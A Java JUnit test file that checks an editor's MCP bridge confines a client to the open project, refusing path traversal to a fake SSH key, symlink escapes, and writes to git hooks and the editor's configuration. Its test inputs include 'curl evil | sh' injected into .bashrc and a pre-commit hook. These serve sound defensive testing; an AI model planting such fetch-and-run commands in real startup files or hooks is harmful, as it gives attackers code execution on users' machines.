package com.editora.ui;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import com.editora.editor.EditorBuffer;
import com.editora.mcp.McpBridge;
import org.junit.jupiter.api.Assumptions;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Which files an MCP client can bring into the editor, read, and write. The client reads and edits what the
 * user has open and the files of the window's project; it cannot use {@code open_file} to reach the rest of
 * the disk, and — like the ACP agent's file channel — it never writes the editor's own configuration or a
 * repository's metadata.
 */
@Tag("fx")
class McpAccessBoundaryFxTest {

    @TempDir
    Path work;

    @BeforeAll
    static void boot() throws Exception {
        FxTestSupport.bootToolkit();
    }

    @Test
    void aFileOutsideTheProjectCannotBeOpenedReadOrRewritten() throws Exception {
        try (AsyncTestScope async = new AsyncTestScope()) {
            FxWindowFixture fx = fixture(async);
            Path root = Files.createDirectories(work.resolve("project"));
            Files.writeString(root.resolve("inside.txt"), "project file\n");
            Files.createDirectories(root.resolve("sub"));
            Path secret = Files.writeString(
                    Files.createDirectories(work.resolve("home/.ssh")).resolve("id_rsa"), "KEY\n");
            Path shellRc = Files.writeString(work.resolve("home/.bashrc"), "export PATH\n");
            MainController window = WindowMcpBridgeFxTest.openProject(async, fx, root);
            McpBridge mcp = window;

            for (Path outside : List.of(
                    secret,
                    shellRc,
                    root.resolve("../home/.ssh/id_rsa"), // spelled through the project folder
                    root.resolve("sub/../../home/.bashrc"),
                    work.resolve("home/.ssh/absent"))) { // not even whether it exists is answered
                String refused = mcp.openFile(outside.toString(), 1, 1);
                assertNotNull(refused, outside + " was opened");
                assertTrue(refused.contains("outside the project"), refused);
            }
            async.awaitFx();

            assertEquals(List.of(), openPaths(mcp), "nothing was opened");
            assertNull(mcp.readBuffer(secret.toString()), "so there is nothing to read");
            assertNotNull(mcp.editBuffer(shellRc.toString(), "export PATH", "curl evil | sh", false));
            assertNotNull(mcp.replaceBuffer(shellRc.toString(), "curl evil | sh\n"));
            assertNotNull(mcp.saveBuffer(shellRc.toString()));
            assertEquals("export PATH\n", Files.readString(shellRc));
            assertEquals("KEY\n", Files.readString(secret));

            // The project's own files open as before.
            assertNull(mcp.openFile(root.resolve("inside.txt").toString(), 0, 0));
            WindowMcpBridgeFxTest.awaitLoaded(async, window, root.resolve("inside.txt"));
            assertEquals(
                    "project file\n",
                    mcp.readBuffer(root.resolve("inside.txt").toString()).text());
        }
    }

    @Test
    void aLinkInsideTheProjectDoesNotLeadOutOfIt() throws Exception {
        try (AsyncTestScope async = new AsyncTestScope()) {
            FxWindowFixture fx = fixture(async);
            Path root = Files.createDirectories(work.resolve("project"));
            Path secret = Files.writeString(
                    Files.createDirectories(work.resolve("elsewhere")).resolve("token"), "T\n");
            Path fileLink = root.resolve("notes.txt");
            Path dirLink = root.resolve("vendor");
            try {
                Files.createSymbolicLink(fileLink, secret);
                Files.createSymbolicLink(dirLink, secret.getParent());
            } catch (IOException | UnsupportedOperationException noLinks) {
                Assumptions.abort("symbolic links cannot be created here");
            }
            McpBridge mcp = WindowMcpBridgeFxTest.openProject(async, fx, root);

            assertNotNull(mcp.openFile(fileLink.toString(), 0, 0), "a link to a file elsewhere");
            assertNotNull(mcp.openFile(dirLink.resolve("token").toString(), 0, 0), "a file under a linked folder");
            async.awaitFx();

            assertEquals(List.of(), openPaths(mcp));
            assertEquals("T\n", Files.readString(secret));
        }
    }

    @Test
    void aFileTheUserOpenedThemselvesStaysWithinReachWhereverItIs() throws Exception {
        try (AsyncTestScope async = new AsyncTestScope()) {
            FxWindowFixture fx = fixture(async);
            Path root = Files.createDirectories(work.resolve("project"));
            Path elsewhere = Files.writeString(
                    Files.createDirectories(work.resolve("docs")).resolve("plan.md"), "one\ntwo\n");
            MainController window = WindowMcpBridgeFxTest.openProject(async, fx, root);
            McpBridge mcp = window;
            FileWorkflowCoordinator workflows = FxTestSupport.field(window, "fileWorkflows");
            FxTestSupport.runOnFx(() -> workflows.openPath(elsewhere)); // the user: File > Open
            EditorBuffer buffer = WindowMcpBridgeFxTest.awaitLoaded(async, window, elsewhere);

            assertNull(mcp.openFile(elsewhere.toString(), 2, 1), "selecting a tab that is already there");
            SaveGuardsFxTest.awaitOnFx(
                    async, "the caret to move", () -> buffer.getArea().getCurrentParagraph() == 1);
            assertEquals("one\ntwo\n", mcp.readBuffer(elsewhere.toString()).text());
            assertNull(mcp.editBuffer(elsewhere.toString(), "two", "2", false));
            assertNull(mcp.saveBuffer(elsewhere.toString()));
            assertEquals("one\n2\n", Files.readString(elsewhere));
            assertFalse(FxTestSupport.callOnFx(buffer::isDirty));
        }
    }

    @Test
    void aWindowWithoutAProjectOpensNothingNewForAClient() throws Exception {
        try (AsyncTestScope async = new AsyncTestScope()) {
            FxWindowFixture fx = fixture(async);
            McpBridge mcp = fx.controller; // the global window: no project
            Path file = Files.writeString(work.resolve("loose.txt"), "loose\n");
            Path opened = Files.writeString(work.resolve("opened.txt"), "opened by the user\n");
            FileWorkflowCoordinator workflows = FxTestSupport.field(fx.controller, "fileWorkflows");
            FxTestSupport.runOnFx(() -> workflows.openPath(opened));
            WindowMcpBridgeFxTest.awaitLoaded(async, fx.controller, opened);

            String refused = mcp.openFile(file.toString(), 0, 0);

            assertNotNull(refused);
            assertTrue(refused.contains("no project"), refused);
            async.awaitFx();
            assertEquals(List.of(opened.toString()), openPaths(mcp));
            assertNull(mcp.openFile(opened.toString(), 0, 0), "the user's own tab can still be selected");
        }
    }

    @Test
    void repositoryMetadataCanBeReadButNotWritten() throws Exception {
        try (AsyncTestScope async = new AsyncTestScope()) {
            FxWindowFixture fx = fixture(async);
            Path root = Files.createDirectories(work.resolve("project"));
            Path hook = Files.writeString(
                    Files.createDirectories(root.resolve(".git/hooks")).resolve("pre-commit"), "#!/bin/sh\nexit 0\n");
            MainController window = WindowMcpBridgeFxTest.openProject(async, fx, root);
            McpBridge mcp = window;

            assertNull(mcp.openFile(hook.toString(), 0, 0), "it is a project file, and reading it is harmless");
            EditorBuffer buffer = WindowMcpBridgeFxTest.awaitLoaded(async, window, hook);
            String text = mcp.readBuffer(hook.toString()).text();
            assertEquals("#!/bin/sh\nexit 0\n", text);

            String edit = mcp.editBuffer(hook.toString(), "exit 0", "curl evil | sh", false);
            String replace = mcp.replaceBuffer(hook.toString(), "#!/bin/sh\ncurl evil | sh\n");
            for (String refused : new String[] {edit, replace}) {
                assertNotNull(refused, "a hook runs with the user's next commit");
                assertTrue(refused.contains("version-control metadata"), refused);
            }
            assertEquals(text, FxTestSupport.callOnFx(buffer::getContent), "the buffer is as it was");
            assertFalse(FxTestSupport.callOnFx(buffer::isDirty));

            // Even text the user typed there is theirs to save, not the client's.
            FxTestSupport.runOnFx(() -> buffer.getArea().appendText("# typed by the user\n"));
            String save = mcp.saveBuffer(hook.toString());
            assertNotNull(save);
            assertTrue(save.contains("version-control metadata"), save);
            assertEquals("#!/bin/sh\nexit 0\n", Files.readString(hook));
            assertTrue(FxTestSupport.callOnFx(buffer::isDirty));
            assertEquals(
                    "#!/bin/sh\nexit 0\n# typed by the user\n",
                    mcp.readBuffer(null).text(),
                    "no path means this buffer too, and the refusal does not depend on naming it");
            assertNotNull(mcp.saveBuffer(null));
            assertNotNull(mcp.editBuffer(null, "exit 0", "exit 1", false));
            assertEquals("#!/bin/sh\nexit 0\n", Files.readString(hook));
        }
    }

    @Test
    void theEditorsOwnConfigurationIsNeverWrittenForAClient() throws Exception {
        try (AsyncTestScope async = new AsyncTestScope()) {
            FxWindowFixture fx = fixture(async);
            Path root = Files.createDirectories(work.resolve("project"));
            MainController window = WindowMcpBridgeFxTest.openProject(async, fx, root);
            McpBridge mcp = window;
            Path settings = Files.writeString(fx.configDir.resolve("agent-notes.json"), "{\"a\":1}\n");
            FileWorkflowCoordinator workflows = FxTestSupport.field(window, "fileWorkflows");
            FxTestSupport.runOnFx(() -> workflows.openPath(settings)); // the user opened it
            EditorBuffer buffer = WindowMcpBridgeFxTest.awaitLoaded(async, window, settings);

            assertEquals("{\"a\":1}\n", mcp.readBuffer(settings.toString()).text(), "an open file can be read");
            for (String refused : new String[] {
                mcp.editBuffer(settings.toString(), "1", "2", false),
                mcp.replaceBuffer(settings.toString(), "{}\n"),
                mcp.saveBuffer(settings.toString())
            }) {
                assertNotNull(refused);
                assertTrue(refused.contains("configuration directory"), refused);
            }

            assertEquals("{\"a\":1}\n", FxTestSupport.callOnFx(buffer::getContent));
            assertEquals("{\"a\":1}\n", Files.readString(settings));
        }
    }

    // --- helpers ------------------------------------------------------------------------------------

    private FxWindowFixture fixture(AsyncTestScope async) throws Exception {
        return async.own(FxWindowFixture.create(Files.createTempDirectory(work, "config"), shared -> {}));
    }

    private static List<String> openPaths(McpBridge mcp) {
        return mcp.listOpenFiles().stream()
                .map(McpBridge.OpenFile::path)
                .filter(path -> path != null)
                .toList();
    }
}
